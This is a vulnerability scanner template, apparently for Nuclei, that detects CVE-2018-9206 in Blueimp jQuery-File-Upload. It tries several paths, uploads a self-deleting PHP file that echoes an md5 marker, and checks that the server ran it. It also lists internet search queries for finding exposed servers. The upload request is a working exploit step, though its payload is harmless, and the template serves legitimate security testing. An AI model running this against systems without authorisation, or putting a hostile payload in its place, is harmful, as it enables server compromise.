id: CVE-2018-9206

info:
  name: Blueimp jQuery-File-Upload <= 9.22.0 - Arbitrary File Upload
  author: KrE80r
  severity: critical
  description: |
    Blueimp jQuery-File-Upload versions 9.22.0 and earlier contain an unrestricted file upload vulnerability in the PHP upload handler. The application allows uploading files with any extension including executable PHP files. When combined with Apache 2.3.9+ default configuration that disables .htaccess files, attackers can upload and execute arbitrary PHP code leading to remote code execution.
  impact: |
    Successful exploitation allows unauthenticated attackers to upload and execute arbitrary PHP files, resulting in complete server compromise with the ability to execute system commands, access sensitive data, and establish persistent backdoors.
  remediation: |
    Upgrade to jQuery-File-Upload version 9.24.1 or later. Additionally, configure the web server to prevent script execution in the upload directory and implement proper file type validation.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-9206
    - https://www.exploit-db.com/exploits/46182
    - https://www.exploit-db.com/exploits/45790
    - https://www.exploit-db.com/exploits/45584
    - https://github.com/blueimp/jQuery-File-Upload/blob/master/VULNERABILITIES.md
    - https://www.rapid7.com/db/modules/exploit/unix/webapp/jquery_file_upload/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-9206
    cwe-id: CWE-434
    epss-score: 0.97473
    epss-percentile: 0.99971
    cpe: cpe:2.3:a:blueimp:jquery_file_upload:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 12
    vendor: blueimp
    product: jquery_file_upload
    shodan-query: http.html:"jquery-file-upload"
    fofa-query: body="jquery-file-upload"
    google-query: inurl:"/jquery-file-upload/server/php"
  tags: cve,cve2018,blueimp,jquery,fileupload,rce,intrusive,vuln

variables:
  rand_file: "{{rand_base(8)}}"

flow: |
  let paths = ["/jquery-file-upload/server/php", "/jQuery-File-Upload/server/php", "/server/php", "/php", "/fileupload/server/php", "/upload/server/php"];
  for (let i = 0; i < paths.length; i++) {
    set("base_path", paths[i]);
    if (http("upload") && http("verify")) {
      break;
    }
  }

http:
  - id: upload
    raw:
      - |
        POST {{base_path}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCVE20189206

        ------WebKitFormBoundaryCVE20189206
        Content-Disposition: form-data; name="files[]"; filename="{{rand_file}}.php"
        Content-Type: application/x-php

        <?php echo md5('CVE-2018-9206');unlink(__FILE__);?>
        ------WebKitFormBoundaryCVE20189206--

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "files")'
          - 'contains(body, rand_file)'
        condition: and
        internal: true

  - id: verify
    raw:
      - |
        GET {{base_path}}/files/{{rand_file}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "20df8fe52342ed94bbc3865087b1d5ce")'
          - '!contains(body, "<?php")'
        condition: and
